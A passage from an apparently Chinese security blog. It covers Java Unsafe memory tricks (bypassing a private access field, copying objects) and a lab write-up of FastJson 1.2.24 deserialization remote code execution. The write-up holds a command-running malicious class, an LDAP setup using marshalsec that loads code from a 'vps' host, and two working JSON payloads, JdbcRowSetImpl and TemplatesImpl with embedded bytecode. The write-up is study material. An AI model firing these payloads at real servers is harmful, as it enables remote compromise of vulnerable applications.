class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Field f = Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        f.setAccessible(<span class="hljs-keyword">true</span>);<br>        Unsafe unsafe = (Unsafe) f.get(<span class="hljs-keyword">null</span>);<br><br>        Guard guard = <span class="hljs-keyword">new</span> Guard();<br>        <span class="hljs-keyword">boolean</span> flag1 = guard.giveAccess();   <span class="hljs-comment">// false, no access</span><br><br>        <span class="hljs-comment">// bypass</span><br>        Field field = guard.getClass().getDeclaredField(<span class="hljs-string">&quot;ACCESS_ALLOWED&quot;</span>);<br>        unsafe.putInt(guard, unsafe.objectFieldOffset(field), <span class="hljs-number">42</span>); <span class="hljs-comment">// memory corruption</span><br>        <span class="hljs-keyword">boolean</span> flag2 = guard.giveAccess(); <span class="hljs-comment">// true, access granted</span><br><br>        System.out.println(flag1);<br>        System.out.println(flag2);<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Guard</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> ACCESS_ALLOWED = <span class="hljs-number">1</span>;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">giveAccess</span><span class="hljs-params">()</span> </span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">42</span> == ACCESS_ALLOWED;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>获取目标对象字段在内存中的offset，使用putInt()方法，修改类的私有变量ACCESS_ALLOWED</p><p>在已知类结构的时候，数据的偏移总是可以获得的（与c++中的类中数据的偏移计算是一致的）</p><p>sizeOf 计算内存大小（Unsafe.getDeclaredFields和Unsafe.objectFieldOffset）</p><h3 id="sizeOf"><a href="#sizeOf" class="headerlink" title="sizeOf"></a>sizeOf</h3><p>结合反射和objectFieldOffset()函数实现类似c中的sizeof()函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    Guard guard = <span class="hljs-keyword">new</span> Guard();<br>    sizeOf(guard); <span class="hljs-comment">// 16, the size of guard</span><br>&#125;<br><br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Guard</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> ACCESS_ALLOWED = <span class="hljs-number">1</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">giveAccess</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">42</span> == ACCESS_ALLOWED;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">sizeOf</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    Field f = Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>    f.setAccessible(<span class="hljs-keyword">true</span>);<br>    Unsafe unsafe = (Unsafe) f.get(<span class="hljs-keyword">null</span>);<br><br>    HashSet&lt;Field&gt; fields = <span class="hljs-keyword">new</span> HashSet();<br>    Class c = o.getClass();<br>    <span class="hljs-keyword">while</span> (c != Object.class) &#123;<br>        <span class="hljs-keyword">for</span> (Field field : c.getDeclaredFields()) &#123;<br>            <span class="hljs-keyword">if</span> ((field.getModifiers() &amp; Modifier.STATIC) == <span class="hljs-number">0</span>) &#123;<br>                fields.add(field);<br>            &#125;<br>        &#125;<br>        c = c.getSuperclass();<br>    &#125;<br><br>    <span class="hljs-comment">// get offset</span><br>    <span class="hljs-keyword">long</span> maxSize = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (Field field : fields) &#123;<br>        <span class="hljs-keyword">long</span> offset = unsafe.objectFieldOffset(field);<br>        <span class="hljs-keyword">if</span> (offset &gt; maxSize) &#123;<br>            maxSize = offset;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ((maxSize/<span class="hljs-number">8</span>) + <span class="hljs-number">1</span>) * <span class="hljs-number">8</span>;   <span class="hljs-comment">// padding</span><br>&#125;<br></code></pre></td></tr></table></figure><p>算法的思路非常清晰：从底层子类开始，依次取出它自己和它的所有超类的非静态域，放置到一个HashSet中（重复的只计算一次，Java是单继承），然后使用objectFieldOffset()获得一个最大偏移，最后还考虑了对齐</p><h3 id="Shallow-copy"><a href="#Shallow-copy" class="headerlink" title="Shallow copy"></a>Shallow copy</h3><p>利用Unsafe.copyMemory()，将老地址及其指向的对象的size，拷贝到新的内存地址上。并且浅复制函数可以应用于任意java对象，它的尺寸是动态计算的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Field f = Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        f.setAccessible(<span class="hljs-keyword">true</span>);<br>        unsafe = (Unsafe) f.get(<span class="hljs-keyword">null</span>);<br>        Guard guard = <span class="hljs-keyword">new</span> Guard();<br>        shallowCopy(guard);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Unsafe <span class="hljs-title">getUnsafe</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> unsafe;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> Object <span class="hljs-title">shallowCopy</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">long</span> size = sizeOf(obj);<br>        <span class="hljs-keyword">long</span> start = toAddress(obj);<br>        <span class="hljs-keyword">long</span> address = getUnsafe().allocateMemory(size);<br>        getUnsafe().copyMemory(start, address, size);<br>        <span class="hljs-keyword">return</span> fromAddress(address);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">toAddress</span><span class="hljs-params">(Object obj)</span> </span>&#123;<br>        Object[] array = <span class="hljs-keyword">new</span> Object[]&#123;obj&#125;;<br>        <span class="hljs-keyword">long</span> baseOffset = getUnsafe().arrayBaseOffset(Object[].class);<br>        <span class="hljs-keyword">return</span> normalize(getUnsafe().getLong(array, baseOffset));<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> Object <span class="hljs-title">fromAddress</span><span class="hljs-params">(<span class="hljs-keyword">long</span> address)</span> </span>&#123;<br>        Object[] array = <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-keyword">null</span>&#125;;<br>        <span class="hljs-keyword">long</span> baseOffset = getUnsafe().arrayBaseOffset(Object[].class);<br>        getUnsafe().putLong(array, baseOffset, address);<br>        <span class="hljs-keyword">return</span> array[<span class="hljs-number">0</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Guard</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> ACCESS_ALLOWED = <span class="hljs-number">1</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">giveAccess</span><span class="hljs-params">()</span> </span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">42</span> == ACCESS_ALLOWED;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">sizeOf</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Field f = Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        f.setAccessible(<span class="hljs-keyword">true</span>);<br>        Unsafe unsafe = (Unsafe) f.get(<span class="hljs-keyword">null</span>);<br><br>        HashSet&lt;Field&gt; fields = <span class="hljs-keyword">new</span> HashSet();<br>        Class c = o.getClass();<br>        <span class="hljs-keyword">while</span> (c != Object.class) &#123;<br>            <span class="hljs-keyword">for</span> (Field field : c.getDeclaredFields()) &#123;<br>                <span class="hljs-keyword">if</span> ((field.getModifiers() &amp; Modifier.STATIC) == <span class="hljs-number">0</span>) &#123;<br>                    fields.add(field);<br>                &#125;<br>            &#125;<br>            c = c.getSuperclass();<br>        &#125;<br><br>        <span class="hljs-comment">// get offset</span><br>        <span class="hljs-keyword">long</span> maxSize = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (Field field : fields) &#123;<br>            <span class="hljs-keyword">long</span> offset = unsafe.objectFieldOffset(field);<br>            <span class="hljs-keyword">if</span> (offset &gt; maxSize) &#123;<br>                maxSize = offset;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ((maxSize / <span class="hljs-number">8</span>) + <span class="hljs-number">1</span>) * <span class="hljs-number">8</span>;   <span class="hljs-comment">// padding</span><br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="Hide-Password"><a href="#Hide-Password" class="headerlink" title="Hide Password"></a>Hide Password</h3><p>一般密码都要存成byte[]或者char[]数组，为什么呢？因为我们使用完了，可以直接将他们设为null。但如果密码存在String中，将其设为null，密码实际任然存在在内存中，等到GC后，才能被释放，就很不安全。所以当我们把密码字段存储在String中时，在密码字段使用完之后，最安全的做法是：将它的值覆盖。很多不再需要的，但是又是比较机密的对象，想快点消灭证据，都可以通过这种方法来消除。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Field stringValue = String.class.getDeclaredField(<span class="hljs-string">&quot;value&quot;</span>);<br>stringValue.setAccessible(<span class="hljs-keyword">true</span>);<br><span class="hljs-keyword">char</span>[] mem = (<span class="hljs-keyword">char</span>[]) stringValue.get(password);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; mem.length; i++) &#123;<br>    mem[i] = <span class="hljs-string">&#x27;?&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Multiple-Inheritance"><a href="#Multiple-Inheritance" class="headerlink" title="Multiple Inheritance"></a>Multiple Inheritance</h3><p>在java中没有多继承，除非我们能在这些不同的类互相强制转换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">long</span> intClassAddress = normalize(getUnsafe().getInt(<span class="hljs-keyword">new</span> Integer(<span class="hljs-number">0</span>), <span class="hljs-number">4L</span>));<br><span class="hljs-keyword">long</span> strClassAddress = normalize(getUnsafe().getInt(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">4L</span>));<br>getUnsafe().putAddress(intClassAddress + <span class="hljs-number">36</span>, strClassAddress);<br></code></pre></td></tr></table></figure><p>上面这段代码将String添加为int的父类，所以我们转换的时候就不会报错了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">(String) (Object) (<span class="hljs-keyword">new</span> Integer(<span class="hljs-number">666</span>))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>FastJson反序列化</title>
    <link href="/2023/03/15/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/03/15/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="FastJson反序列化"><a href="#FastJson反序列化" class="headerlink" title="FastJson反序列化"></a>FastJson反序列化</h1><p>java处理JSON数据有三个比较流行的类库，gson(google维护)、jackson、fastjson，fastjson是阿里巴巴一个开源的json相关的java library，主要的API：JSON.parseObject和JSON.parse</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>创建一个springboot，mavenn添加fastjson1.2.24依赖</p><p>代码可以参考vulhub的fastjsondemo.jar包</p><p><a href="https://dongguabai.blog.csdn.net/article/details/86617059?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_paycolumn_v3&utm_relevant_index=2">启动服务可能遇到的问题</a></p><p>需要在创建springboot勾选web模块</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220320234749700.png"></p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>访问页面返回一个json，修改一下值post回去，发现可以更新json中的name值，age固定返回20</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220321203139793.png"></p><p>编写一个恶意类用来远程加载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Touchfile</span> </span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            String[] cmd = &#123; <span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;/tmp/success&quot;</span> &#125;;<br>            Runtime.getRuntime().exec(cmd).waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> do nothing</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译，起一个http.server，再起一个marshalsec.ldap “<a href="http://vps/#Touchfile&quot;">http://vps/#Touchfile&quot;</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220321225602870.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>有两个payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://vps/Touchfile&quot;</span>,<span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="hljs-attr">&quot;_bytecodes&quot;</span>:[<span class="hljs-string">&quot;yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=&quot;</span>],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,<span class="hljs-attr">&quot;_outputProperties&quot;</span>:&#123; &#125;&#125;<br></code></pre></td></tr></table></figure><p>着重分析第一个payload，参考<a href="https://xz.aliyun.com/t/8046?page=4#toc-4">summer师傅</a>的文章，payload分三部分，<code>@type</code> 、<code>dataSourceName</code> 、<code>autoCommit</code></p><p>第一个<code>@type</code>的作用？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.fastjsondemo;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typedowhat</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        User user = <span class="hljs-keyword">new</span> User();<br>        user.setAge(<span class="hljs-number">18</span>);<br>        user.setName(<span class="hljs-string">&quot;h^k&quot;</span>);<br><br>        String str1 = JSONObject.toJSONString(user);<br>        String str2 = JSONObject.toJSONString(user, SerializerFeature.WriteClassName);<span class="hljs-comment">//两者做对比</span><br><br>        System.out.println(str1);<br>        System.out.println(str2);<br>        <span class="hljs-comment">//可知@type的作用是指定json解析到哪个类</span><br><br>        <span class="hljs-comment">//解析</span><br>        System.out.println(JSON.parse(str1));<br>        System.out.println(JSON.parse(str2));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;age&quot;</span>:<span class="hljs-number">18</span>,<span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;h^k&quot;</span>&#125;<br>&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.example.fastjsondemo.User&quot;</span>,<span class="hljs-attr">&quot;age&quot;</span>:<span class="hljs-number">18</span>,<span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;h^k&quot;</span>&#125;<br>&#123;<span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;h^k&quot;</span>,<span class="hljs-attr">&quot;age&quot;</span>:<span class="hljs-number">18</span>&#125;<br>com.example.fastjsondemo.User@<span class="hljs-number">7</span>de26db8<br></code></pre></td></tr></table></figure><p>@type字段用来指定该JSON还原成何种类型的对象，在反序列化的时候方便操作</p><p>因此在JSON序列化的方法加入<code>SerializerFeature.WriteClassName</code>特征字段。序列化出来的结果会在开头加一个<code>@type</code>字段，值为进行序列化的类名。同时，漏洞也就跃然纸上了，通过<code>@type</code>控制获取到的类对象</p><p>断点打在JSON.parse()方法上，一步步跟到</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322174230645.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322174547070.png"></p><p>匹配<code>&#123;</code>，开始解析了，case 12创建对象，调用parseObject()方法解析</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322203041861.png"></p><p>json格式中的<code>,</code> <code>&quot;</code> <code>:</code> <code>&#125;</code>在parseObject方法里面开始匹配</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322204905966.png"></p><p>获取到<code>@type</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322215646236.png"></p><p>判断<code>key == JSON.DEFAULT_TYPE_KEY</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322215934108.png"></p><p>开始反序列化</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322220329863.png"></p><p><code>deserializer.deserialze(this, clazz, fieldName);</code></p><p>步进下去会提示<code>debug info not available</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323004328629.png"></p><p><a href="https://blog.csdn.net/hl_java/article/details/79078886">原因&amp;解决方法</a>，这里不解决了，Ctrl+鼠标单击，焯</p><p>来到这里，浏览很久还没有看到setValue，折一下这么长。。没有debug的痛苦</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323004724811.png"></p><p>在github找到Gadget链🤣</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">/<span class="hljs-strong">**</span><br><span class="hljs-strong"> <span class="hljs-emphasis">* Gadget chain:</span></span><br><span class="hljs-emphasis"><span class="hljs-strong"> *</span>      JSON.parse()</span><br><span class="hljs-strong"> <span class="hljs-emphasis">*          DefaultJSONParser.parse()</span></span><br><span class="hljs-emphasis"><span class="hljs-strong"> *</span>              DefaultJSONParser.parseObject()</span><br><span class="hljs-strong"> <span class="hljs-emphasis">*                  JavaBeanDeserializer.deserialze()</span></span><br><span class="hljs-emphasis"><span class="hljs-strong"> *</span>                      JavaBeanDeserializer.parseRest()</span><br><span class="hljs-strong"> <span class="hljs-emphasis">*                          FieldDeserializer.setValue()</span></span><br><span class="hljs-emphasis"><span class="hljs-strong"> *</span>                              Reflect.invoke()</span><br><span class="hljs-strong"> <span class="hljs-emphasis">*                                  JdbcRowSetImpl.setAutoCommit()</span></span><br><span class="hljs-emphasis"><span class="hljs-strong"> *</span></span><br><span class="hljs-strong"> <span class="hljs-emphasis">*/</span></span><br></code></pre></td></tr></table></figure><p>搜索<code>setValue()</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323005644331.png"></p><p>进来继续断点，可以debug了</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323010217147.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323010747848.png"></p><p>invoke往下一直跟</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323010837490.png"></p><p>调用connect方法</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323011648052.png"></p><p>至此开花</p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>版本迭代后，通过检测还原类并比对黑名单的方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 